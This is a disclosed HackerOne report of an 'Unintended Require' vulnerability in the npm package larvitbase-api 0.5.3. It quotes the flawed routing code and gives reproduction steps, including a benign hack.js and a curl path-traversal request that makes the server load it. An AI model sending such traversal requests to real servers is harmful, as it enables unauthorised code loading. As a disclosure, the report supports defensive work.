# [larvitbase-api] Unintended Require

## Report Details
- **Report ID**: 566056
- **URL**: https://hackerone.com/reports/566056
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-05-04T10:15:45.993Z
- **Disclosed**: 2019-08-20T07:30:29.330Z

## Reporter
- **Username**: ermilov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Unintended Require vulnerability in `larvitbase-api`
It allows loading arbitary non-production code (js files).

# Module

**module name:** larvitbase-api
**version:** 0.5.3
**npm page:** `https://www.npmjs.com/package/larvitbase-api`

## Module Description

REST http API base framework based on larvitbase (https://github.com/larvit/larvitbase)

## Module Stats

59 downloads in the last day
250 downloads in the last week
715 downloads in the last month

# Vulnerability

## Vulnerability Description

`larvitbase-api` is an HTTP server which dynamically loads (with help of `require()`) some parts of the code. As long as the path to required module is partially depend on the url (req.urlBase), anybody can cause code to load that was not intended to run on the server.

source code example:

https://github.com/larvit/larvitbase-api/blob/master/index.js#L183
```
req.routed = {
	controllerFullPath: path.join(altControllerPaths[i], req.urlBase) + '.js',
	controllerPath: req.urlBase
};
```

https://github.com/larvit/larvitbase-api/blob/master/index.js#L210
```
require(req.routed.controllerFullPath)(req, res, cb);
```

Detailed description of this bug can be found here: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html

## Steps To Reproduce:

* create directory for testing
```
mkdir poc
cd poc/
```

* install package
```
npm i larvitbase-api
```

* create index.js file with default usage of larvitbase-api

index.js (example code form https://www.npmjs.com/package/larvitbase-api)
```
const	Api	= require('larvitbase-api');

let	api;

api = new Api({
    'baseOptions':	{'httpOptions': 8001},
    'routerOptions':	{},
    'reqParserOptions':	{},
});

api.start(function (err) {});
```

* create hack.js file with some arbitary code for testing

hack.js
```
console.log('pwned');
```

* start index.js
```
node index.js
```

* send crafted request to web app (localhost:8001 by deafult) in order to force using of hack.js script
```
curl --path-as-is 'http://localhost:8001/../../../../../../hack'
```

* index.js should log something like this to terminal:
```
pwned
                        require(req.routed.controllerFullPath)(req, res, cb);
TypeError: require(...) is not a function
```

## Patch

## Supporting Material/References:

- OS: Linux Mint current
- Node.js: 8.11.1
- NPM: 6.4.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker is able to control the x in require(x) and cause code to load that was not intended to run on the server.

## Attachments
No attachments
